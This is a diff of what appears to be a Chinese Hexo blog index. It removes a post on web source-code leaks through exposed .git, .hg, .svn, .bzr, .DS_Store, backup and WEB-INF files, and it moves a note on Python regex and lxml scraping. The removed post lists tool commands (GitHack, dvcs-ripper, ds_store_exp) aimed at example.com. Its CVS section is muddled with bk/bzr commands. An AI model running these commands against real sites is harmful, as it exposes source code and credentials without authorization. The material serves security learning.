-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rip -hg.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F;</span><br></pre></td></tr></table></figure>
-
-<h4 id="0x02-git源码泄漏"><a href="#0x02-git源码泄漏" class="headerlink" title="0x02: .git源码泄漏"></a>0x02: .git源码泄漏</h4><p>漏洞成因：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p>
-<p>漏洞利用:GitHack</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GitHack.py http:&#x2F;&#x2F;www.example.com&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
-
-<h4 id="0x03-DS-Store文件泄漏"><a href="#0x03-DS-Store文件泄漏" class="headerlink" title="0x03:  .DS_Store文件泄漏"></a>0x03:  .DS_Store文件泄漏</h4><p>漏洞成因:在发布代码时未删除文件夹中隐藏的.DS_store,被发现后，获取敏感信息.</p>
-<p>漏洞利用:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;.ds_store</span><br></pre></td></tr></table></figure>
-
-<p>工具:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dsstoreexp</span><br><span class="line">python ds_store_exp.py http:&#x2F;&#x2F;www.example.com&#x2F;.DS_Store</span><br></pre></td></tr></table></figure>
-
-<h4 id="0x04-网站备份压缩文件"><a href="#0x04-网站备份压缩文件" class="headerlink" title="0x04:网站备份压缩文件"></a>0x04:网站备份压缩文件</h4><p>当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p>
-<p>漏洞成因：</p>
-<ul>
-<li>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。</li>
-<li>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</li>
-</ul>
-<p>漏洞测试：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.rar</span><br><span class="line">.zip</span><br><span class="line">.7z</span><br><span class="line">.tar.gz</span><br><span class="line">.bak</span><br><span class="line">.swp</span><br><span class="line">.txt</span><br><span class="line">.html</span><br></pre></td></tr></table></figure>
-
-<h4 id="0x05-SVN文件泄漏"><a href="#0x05-SVN文件泄漏" class="headerlink" title="0x05:SVN文件泄漏"></a>0x05:SVN文件泄漏</h4><p>漏洞利用：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dvcs-ripper</span><br><span class="line">rip-svn.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.svn&#x2F;</span><br></pre></td></tr></table></figure>
-
-<h4 id="0x06：WEB-INF-web-xml泄漏"><a href="#0x06：WEB-INF-web-xml泄漏" class="headerlink" title="0x06：WEB-INF/web.xml泄漏"></a>0x06：WEB-INF/web.xml泄漏</h4><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
-<p>WEB-INF主要文件或目录：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</span><br></pre></td></tr></table></figure>
-
-<p>漏洞利用：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</span><br></pre></td></tr></table></figure>
-
-<p>0x07：CVS泄漏</p>
-<p>漏洞利用:</p>
-<p>取回源码：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bk clone http:&#x2F;&#x2F;url&#x2F;name dir&#x2F;&#x2F;这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bk changes</span><br><span class="line">Bazaar&#x2F;bzr</span><br><span class="line">&#x2F;&#x2F;查看所有的改变的命令，转到download的目录</span><br></pre></td></tr></table></figure>
-
-<p>工具：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dvcs-ripper</span><br><span class="line">rip-bzr.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.bzr&#x2F;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>敏感信息</tag>
       </tags>
   </entry>
   <entry>
@@ -1562,22 +1562,6 @@
       </tags>
   </entry>
   <entry>
-    <title>爬虫</title>
-    <url>/2020/01/13/%E7%88%AC%E8%99%AB/</url>
-    <content><![CDATA[<h3 id="re模块"><a href="#re模块" class="headerlink" title="re模块"></a>re模块</h3><p>import re<a id="more"></a></p>
-<h4 id="匹配任意字符除了换行符"><a href="#匹配任意字符除了换行符" class="headerlink" title=". 匹配任意字符除了换行符"></a>. 匹配任意字符除了换行符</h4><p>[…] 匹配字符集<br>\d/\D 匹配数字/非数字<br>\s/\S 匹配空白/非空白字符<br>\w/\W匹配单词字符[a-zA-Z0-9]/非单词字符</p>
-<p>*匹配前一个字符0次或者无限次</p>
-<p>+匹配前一个字符1次或者无限次<br>？ 匹配前一个字符0次或者1次<br>{m}/{m,n}匹配前一个字符m次或者n次<br>*? /+? /??匹配模式变为非贪婪<br>^匹配字符串开头<br>$匹配字符串结尾<br>\A/\Z指定的字符串匹配必须出现在开头/结尾</p>
-<h4 id="匹配方式"><a href="#匹配方式" class="headerlink" title="匹配方式:"></a>匹配方式:</h4><p>match方法从开头开始匹配内容，失败返回None<br>search扫描整个匹配内容返回第一个成功的匹配<br>compile编译一个正则表达式<br>findall找到所有匹配的子串，并返回一个列表，未找到则返回空列表<br>sub(正则表达式，替换内容，替换目标)<br>spilt(res，a)分割</p>
-<h3 id="lxml库"><a href="#lxml库" class="headerlink" title="lxml库"></a>lxml库</h3><h4 id="xpath"><a href="#xpath" class="headerlink" title="xpath"></a>xpath</h4><p>1.安装 pip install lxml<br>2.语法<br>(1)选取节点：<br>nodename  选取此节点的所有子节点<br>/         从根节点选取<br>//          从匹配选择的当前节点选择文档中的节点，不考虑位置‘<br>.          选取当前节点<br>..          选取当前节点的父节点<br>@          选取属性<br>(2)谓语<br>//title[@lang]    选取所有拥有名为 lang 的属性的 title 元素<br>//title[@lang=’eng’]    选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性<br>(3)选取未知节点</p>
-<p>‘*’匹配任何元素节点<br>@”星号”    匹配任何属性节点<br>node()    匹配任何类型的节点</p>
-<p>lxml主要是为了用来解析html，作用和正则匹配差不多，但是使用起来会更加方便</p>
-]]></content>
-      <tags>
-        <tag>climb</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>服务端模板注入</title>
     <url>/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h4 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01:简介"></a>0x01:简介<a id="more"></a></h4><p>模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。</p>
@@ -1624,6 +1608,22 @@
 ]]></content>
       <tags>
         <tag>模板注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>爬虫</title>
+    <url>/2020/01/13/%E7%88%AC%E8%99%AB/</url>
+    <content><![CDATA[<h3 id="re模块"><a href="#re模块" class="headerlink" title="re模块"></a>re模块</h3><p>import re<a id="more"></a></p>
+<h4 id="匹配任意字符除了换行符"><a href="#匹配任意字符除了换行符" class="headerlink" title=". 匹配任意字符除了换行符"></a>. 匹配任意字符除了换行符</h4><p>[…] 匹配字符集<br>\d/\D 匹配数字/非数字<br>\s/\S 匹配空白/非空白字符<br>\w/\W匹配单词字符[a-zA-Z0-9]/非单词字符</p>
+<p>*匹配前一个字符0次或者无限次</p>
+<p>+匹配前一个字符1次或者无限次<br>？ 匹配前一个字符0次或者1次<br>{m}/{m,n}匹配前一个字符m次或者n次<br>*? /+? /??匹配模式变为非贪婪<br>^匹配字符串开头<br>$匹配字符串结尾<br>\A/\Z指定的字符串匹配必须出现在开头/结尾</p>
+<h4 id="匹配方式"><a href="#匹配方式" class="headerlink" title="匹配方式:"></a>匹配方式:</h4><p>match方法从开头开始匹配内容，失败返回None<br>search扫描整个匹配内容返回第一个成功的匹配<br>compile编译一个正则表达式<br>findall找到所有匹配的子串，并返回一个列表，未找到则返回空列表<br>sub(正则表达式，替换内容，替换目标)<br>spilt(res，a)分割</p>
+<h3 id="lxml库"><a href="#lxml库" class="headerlink" title="lxml库"></a>lxml库</h3><h4 id="xpath"><a href="#xpath" class="headerlink" title="xpath"></a>xpath</h4><p>1.安装 pip install lxml<br>2.语法<br>(1)选取节点：<br>nodename  选取此节点的所有子节点<br>/         从根节点选取<br>//          从匹配选择的当前节点选择文档中的节点，不考虑位置‘<br>.          选取当前节点<br>..          选取当前节点的父节点<br>@          选取属性<br>(2)谓语<br>//title[@lang]    选取所有拥有名为 lang 的属性的 title 元素<br>//title[@lang=’eng’]    选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性<br>(3)选取未知节点</p>
+<p>‘*’匹配任何元素节点<br>@”星号”    匹配任何属性节点<br>node()    匹配任何类型的节点</p>
+<p>lxml主要是为了用来解析html，作用和正则匹配差不多，但是使用起来会更加方便</p>
+]]></content>
+      <tags>
+        <tag>climb</tag>
       </tags>
   </entry>
   <entry>
